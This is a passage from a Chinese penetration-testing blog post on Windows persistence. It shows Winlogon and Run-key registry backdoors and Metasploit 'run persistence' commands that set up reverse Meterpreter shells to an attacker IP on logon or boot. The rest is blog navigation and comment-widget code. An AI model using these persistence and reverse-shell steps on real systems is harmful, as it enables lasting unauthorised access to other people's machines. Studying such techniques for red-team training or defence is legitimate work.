+<p>如上图所示，后门创建成功。此时我们重新开一个metasploit监听，然后输入“shutdown -r -t 0”命令让目标主机重启，当目标主机重新启动后便会启动执行backdoor.exe后门程序，我们攻击机的新开的metasploit监听上就会成功上线：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049149.jpeg" alt="图片"></p>
+<p>我们还可以操作注册表的Userinit键：</p>
+<p>*<strong>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit*</strong></p>
+<p>让目标主机在用户进行登录时，winlogon运行指定的后门程序。</p>
+<p>除此之外还有以下可利用的注册表键：</p>
+<p>*<strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce &#x2F;&#x2F; 只会在开机*</strong></p>
+<p>*<strong>时启动一次*</strong></p>
+<p>*<strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices*</strong></p>
+<p>*<strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce*</strong></p>
+<p><strong>Metasploit 下的利用</strong></p>
+<p>Metasploit通过使用Meterpreter脚本和后渗透模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个有效payload，该payload将被上传到目标主机的磁盘上，并创建一个注册表项，该注册表项将在用户登录期间循环运行该有效负载。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r</span><br><span class="line">192.168.52.129</span><br><span class="line">run persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r</span><br><span class="line">192.168.52.129</span><br><span class="line">//-U指定启动方式为用户登录时自启动</span><br><span class="line">//-X指定启动的方式为开机自启动</span><br><span class="line">//-P 指定所使用的payload</span><br><span class="line">//-i不断尝试反向连接的时间间隔，我们这里设置的是5秒钟执行一次</span><br><span class="line">//–r指定攻击者的ip</span><br><span class="line">//-p 指定攻击者监听的端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如上图所示执行成功，生成后门后，只要目标主机重启或者登录，我们将在特定的时间间隔保持meterpreter会话了。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/backup.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/js/social-share.min.css" media="print" onload="this.media='all'"><script src="/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/212af6cb.html"><img class="prev-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">红蓝对抗之钓鱼篇：常见钓鱼思路总结</div></div></a></div><div class="next-post pull-right"><a href="/posts/fe24ba37.html"><img class="next-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">端口转发、映射与代理的了解与常用工具的推荐</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/a83843a4.html" title="MSSQL不出网文件落地上线方式"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">MSSQL不出网文件落地上线方式</div></div></a></div><div><a href="/posts/8822d497.html" title="优秀靶机推荐"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">优秀靶机推荐</div></div></a></div><div><a href="/posts/dad1caf4.html" title="msf及socks代理转发"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">msf及socks代理转发</div></div></a></div><div><a href="/posts/721e2121.html" title="内网渗透常用命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">内网渗透常用命令</div></div></a></div><div><a href="/posts/169a3c2d.html" title="利用goproxy http上线不出网主机"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">利用goproxy http上线不出网主机</div></div></a></div><div><a href="/posts/9663dae0.html" title="域内信息收集命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">域内信息收集命令</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.</span> <span class="toc-text">0x01 windows权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Windows%E7%B3%BB%E7%BB%9F%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7"><span class="toc-number">1.1.</span> <span class="toc-text">1. Windows系统隐藏账户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Shift-%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.</span> <span class="toc-text">2. Shift 粘滞键后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.</span> <span class="toc-text">3.  注册表键后门</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/backup.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Fstraw</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ccc-f.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/fancybox.umd.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="/js/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>var requestSetting = function (from,set) {
+    var from = from
+    var setting = set.split(',').filter(function(item){
+    return from.indexOf(item) > -1
+    });
+    setting = setting.length == 0 ? from :setting;
+    return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'')
+var requiredFields = requestSetting(['nick','mail'],'nick,mail')
+function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      master:'7f26fd285f1e832baef86f5bcaadd06a',
+      pageSize:'10',
+      lang:'zh-CN',
+      placeholder:'建议使用QQ邮箱,评论头像采用QQ头像',
+      recordIP:'true',
+      enableQQ:'true',
+      requiredFields: requiredFields,
+      appId: '9xmgN7UpSgxN7k2zu16HHcl6-gzGzoHsz',
+      appKey: '6t7uQFgue7owtGg4R7ieIYWu',
+      avatar: 'monsterid',
+      serverURLs: 'https://9xmgn7up.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('/js/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="/js/fireworks.min.js"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>((window.gitter = {}).chat = {}).options = {
+  disableDefaultChat: true,
+};
+document.addEventListener('gitter-sidecar-ready', (e) => {
+  const GitterChat = e.detail.Chat
+  let chat
+
+  function initGitter () {
+    chat = new GitterChat({
+      room: 'blogroom/test',
+      activationElement: '#chat_btn'
+    });
+  }
+
+  initGitter()
+
+  if (false) {
+    document.addEventListener('pjax:complete', () => {
+      chat.destroy()
+      initGitter()
+    })
+  }
+
+})</script><script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async="async" defer="defer"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
